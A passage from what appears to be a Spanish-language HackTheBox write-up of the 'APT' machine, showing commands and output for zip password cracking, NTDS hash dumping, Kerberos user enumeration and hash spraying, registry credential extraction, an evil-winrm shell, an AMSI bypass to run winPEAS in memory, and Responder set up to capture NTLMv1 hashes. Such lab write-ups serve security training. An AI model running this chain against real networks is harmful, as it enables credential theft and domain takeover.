Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
iloveyousomuch   <span class="o">(</span>backup.zip<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-03-31 19:56<span class="o">)</span> 16.66g/s 136533p/s 136533c/s 136533C/s newzealand..whitetiger
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Y ahora si podemos usar <code class="language-plaintext highlighter-rouge">unzip</code> pasándole la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
  inflating: Active Directory/ntds.dit
  inflating: Active Directory/ntds.jfm
   creating: registry/
  inflating: registry/SECURITY
  inflating: registry/SYSTEM
</code></pre></div></div>

<ul>
  <li>Podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> ya que el <code class="language-plaintext highlighter-rouge">ntds</code> y el <code class="language-plaintext highlighter-rouge">SYSTEM</code> lo tenemos para dumpear <code class="language-plaintext highlighter-rouge">hashes</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> registry/SYSTEM <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit LOCAL <span class="o">&gt;</span> hashes
</code></pre></div></div>

<ul>
  <li>Bueno tenemos 2000 usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>hashes | <span class="nb">wc</span> <span class="nt">-l</span>
2000
</code></pre></div></div>

<ul>
  <li>Para validar usuarios validos del dominio podemos emplear le herramienta <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">--dc</span> apt <span class="nt">-d</span> htb.local <span class="nb">users

    </span>__             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/31/24 - Ronnie Flathers @ropnop

2024/03/31 20:13:04 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/03/31 20:13:04 <span class="o">&gt;</span>  	apt:88

2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 APT<span class="nv">$@</span>htb.local
2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@htb.local
2024/03/31 20:17:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 henry.vinson@htb.local
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno tenemos un usuario valido que se llama <strong>henry.vinson</strong>.</p>
  </li>
  <li>
    <p>Si probamos obtener un TGT para el usuario que tenemos no funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> user_valid.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User henry.vinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que vamos hacer ahora es fuerza bruta para ver si de los hashes que tenemos alguno le corresponde al usuario.</p>
  </li>
  <li>
    <p>Pero hemos sido baneados.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> hashes
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:3ae49ec5e6fed82ceea0dc2be77750ab STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:531c98e26cfa3caee2174af495031187 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:fde29e6cb61b4f7fda1ad5cd2759329d STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:51d368765462e9c5aebc456946d8dc86 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:273c48fb014f8e5bf9e2918e3bf7bfbd STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:98590500f99a1bee7559e97ad342d995 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:10cf01167854082e180cf549f63c0285 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:813f9d0988b9242eec1e45907344b591 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:6149000a4f3f7c57642cbee1ea70c3e1 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
^C

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Shutting down, please wait...
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
</code></pre></div></div>

<h2 id="shell-as-henry_vinson_adm">Shell as henry_vinson_adm</h2>

<ul>
  <li>No podemos aplicar fuerza bruta por <strong>smb</strong> pero si por <code class="language-plaintext highlighter-rouge">kerberos</code> <a href="https://github.com/0xAnomaly/KerbSpray">https://github.com/0xAnomaly/KerbSpray</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  KerbSpray git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 KerbSpray.py htb.local henry.vinson apt.local.htb hashes
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Spraying Hashes...

<span class="o">[</span>i] Domain:             htb.local
<span class="o">[</span>i] Target User:        henry.vinson
<span class="o">[</span>i] Domain Controller:  apt.local.htb
<span class="o">[</span>+] Success htb.local/henry.vinson
<span class="o">[</span>+] Hash Found: e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div></div>

<ul>
  <li>Ahora que tenemos el <strong>hash</strong> podemos comprobar si es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> <span class="s1">'e53d87d42adaa3ca32bdb34a876cbffb'</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos credenciales validas podemos intentar un <code class="language-plaintext highlighter-rouge">Kerberoasting attack</code> para solicitar tickets TGS <a href="https://ciberseguridad.com/amenzas/ataques-kerberoasting/">https://ciberseguridad.com/amenzas/ataques-kerberoasting/</a>.</p>
  </li>
  <li>
    <p>Pero bueno no tuvimos éxito.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers  htb.local/henry.vinson <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
</code></pre></div></div>

<ul>
  <li>Podemos listar registros de la maquina <a href="https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.">https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.</a> para esto podemos usar la herramienta de <code class="language-plaintext highlighter-rouge">impacket-reg</code> le tenemos que proporcionar un <strong>KeyName</strong> <a href="https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html">https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU<span class="se">\C</span>onsole
HKU<span class="se">\C</span>ontrol Panel
HKU<span class="se">\E</span>nvironment
HKU<span class="se">\K</span>eyboard Layout
HKU<span class="se">\N</span>etwork
HKU<span class="se">\S</span>oftware
HKU<span class="se">\S</span>ystem
HKU<span class="se">\V</span>olatile Environment
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver lo que hay en <code class="language-plaintext highlighter-rouge">Software</code>.</p>
  </li>
  <li>
    <p>Si miramos vemos que hay un <code class="language-plaintext highlighter-rouge">GiganticHostingManagementSystem</code> y la pagina web de la maquina se llama GiganticHosting.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class="se">\S</span>oftware
HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
HKU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft
HKU<span class="se">\S</span>oftware<span class="se">\P</span>olicies
HKU<span class="se">\S</span>oftware<span class="se">\R</span>egisteredApplications
HKU<span class="se">\S</span>oftware<span class="se">\S</span>ysinternals
HKU<span class="se">\S</span>oftware<span class="se">\V</span>Mware, Inc.
HKU<span class="se">\S</span>oftware<span class="se">\W</span>ow6432Node
HKU<span class="se">\S</span>oftware<span class="se">\C</span>lasses
</code></pre></div></div>

<ul>
  <li>Si vemos lo que hay encontramos un usuario nuevo y su contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software\GiganticHostingManagementSystem'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
</code></pre></div></div>

<ul>
  <li>Ahora podemos validas las credenciales para ver si son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht
</code></pre></div></div>

<ul>
  <li>Algo que podemos hacer es ver si el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm htb.local <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
SMB         apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
HTTP        apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://apt:5985/wsman
WINRM       apt             5985   APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt.local.htb <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> G1#Ny5@2dvht

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\h</span>enry.vinson_adm
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>         4/1/2024   6:29 PM             34 user.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
d559647d74b6b9fe38018220d86e0a7e
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>
    <p>Después de enumerar no encontré mucho así que vamos a usar una herramienta famosa de reconocimiento <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f">https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f</a>.</p>
  </li>
  <li>
    <p>Pero bueno si lo ejecutamos vemos que el <strong>antivirus</strong> lo detecta y no se puede ejecuta por eso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/APT/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; .<span class="se">\W</span>inPEASx64.exe
Program <span class="s1">'winPEASx64.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .<span class="se">\W</span>inPEASx64.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\W</span>inPEASx64.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Pero podemos hacer un <strong>Bypass</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; menu


   ,.   <span class="o">(</span>   <span class="nb">.</span>      <span class="o">)</span>               <span class="s2">"            ,.   (   .      )       .
  ("</span>  <span class="o">(</span>  <span class="o">)</span>  <span class="o">)</span><span class="s1">'     ,'</span>             <span class="o">(</span><span class="sb">`</span>     <span class="s1">'`    ("     )  )'</span>     ,<span class="s1">'   .  ,)
.; )  '</span> <span class="o">((</span> <span class="o">(</span><span class="s2">" )    ;(,      .     ;)  "</span>  <span class="o">)</span><span class="s2">"  .; )  ' (( ("</span> <span class="o">)</span>   <span class="o">)</span><span class="p">;</span><span class="o">(</span>,   <span class="o">)((</span>
_<span class="s2">".,_,.__).,) (.._( ._),     )  , (._..( '.._"</span>._, <span class="nb">.</span> <span class="s1">'._)_(..,_(_".) _( _'</span><span class="o">)</span>
<span class="se">\_</span>   _____/__  _|__|  |    <span class="o">((</span>  <span class="o">(</span>  /  <span class="se">\ </span>   /  <span class="se">\_</span>_| ____<span class="se">\_</span>_____   <span class="se">\ </span> /     <span class="se">\</span>
 |    __<span class="o">)</span>_<span class="se">\ </span> <span class="se">\/</span> /  |  |    <span class="p">;</span>_<span class="o">)</span>_<span class="s1">') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
</span></code></pre></div></div>

<ul>
  <li>Primero vamos a ejecutar el <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Bypass-4MSI

Info: Patching 4MSI, please be patient...

<span class="o">[</span>+] Success!
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora usamos el <code class="language-plaintext highlighter-rouge">Invoke-Binary</code> para que desde nuestro equipo se ejecute indicándole la ruta y lo estaríamos inyectando en memoria.</p>
  </li>
  <li>
    <p>Una vez que termine nos reportara todo el <code class="language-plaintext highlighter-rouge">output</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Invoke-Binary /home/miguel/Hackthebox/APT/content/winPEASx64.exe
</code></pre></div></div>

<ul>
  <li>Lo mas interesante es esto vemos que soporta <code class="language-plaintext highlighter-rouge">NTLMv1</code> y es criptografía débil.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    : 2 <span class="o">(</span>Send NTLM response only<span class="o">)</span>


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing <span class="o">(</span>Negotiate signing<span class="o">)</span>

  Session Security
      NTLMMinClientSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>
        <span class="o">[!]</span> NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>

        <span class="o">[!]</span> NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     :  <span class="o">(</span>Not defined<span class="o">)</span>
      OutboundRestrictions    :  <span class="o">(</span>Not defined<span class="o">)</span>
      InboundAuditing         :  <span class="o">(</span>Not defined<span class="o">)</span>
      OutboundExceptions      :
</code></pre></div></div>

<ul>
  <li>
    <p>Algo que podemos hacer es robar el hash <strong>NTLMv1</strong> con el <code class="language-plaintext highlighter-rouge">responder</code> <a href="https://crack.sh/netntlm/">https://crack.sh/netntlm/</a>.</p>
  </li>
  <li>
    <p>Primeramente necesitamos especificar el <strong>challenge</strong> en el archivo <code class="language-plaintext highlighter-rouge">/usr/share/responder/Responder.conf</code> .</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> Custom challenge.
<span class="p">;</span> Use <span class="s2">"Random"</span> <span class="k">for </span>generating a random challenge <span class="k">for </span>each requests <span class="o">(</span>Default<span class="o">)</span>
<span class="c">#Challenge = Random</span>
Challenge <span class="o">=</span> 1122334455667788
<span class="p">;</span> SQLite Database file
<span class="p">;</span> Delete this file to re-capture previously captured hashes
Database <span class="o">=</span> Responder.db
</code></pre></div></div>

<ul>
  <li>Ahora desplegamos el <code class="language-plaintext highlighter-rouge">responder</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>ON]
    Force ESS downgrade        <span class="o">[</span>ON]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.222]
    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...
</span></code></pre></div></div>

<ul>
  <li>Algo que podemos hacer para hacer la autenticación como el <code class="language-plaintext highlighter-rouge">defender</code> esta habilitado podemos hacer que haga un escaneo de un recurso compartido a nivel de red atreves del <code class="language-plaintext highlighter-rouge">MpCmdRun.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       11/21/2016   1:53 AM                en-US
d-----        9/24/2020   9:15 AM                platform
<span class="nt">-a----</span>        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof
<span class="nt">-a----</span>         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM          21004 AmStatusInstall.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof
<span class="nt">-a----</span>         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe
<span class="nt">-a----</span>        3/28/2017   6:23 AM         224256 DataLayer.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM        1514688 DbgHelp.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM         724480 EppManifest.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM            361 FepUnregister.mof
<span class="nt">-a----</span>         3/4/2021   5:03 AM          86528 MpAsDesc.dll
<span class="nt">-a----</span>         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll
<span class="nt">-a----</span>         3/4/2021   4:55 AM         928768 MpClient.dll
<span class="nt">-a----</span>         3/4/2021   5:42 AM         377648 MpCmdRun.exe
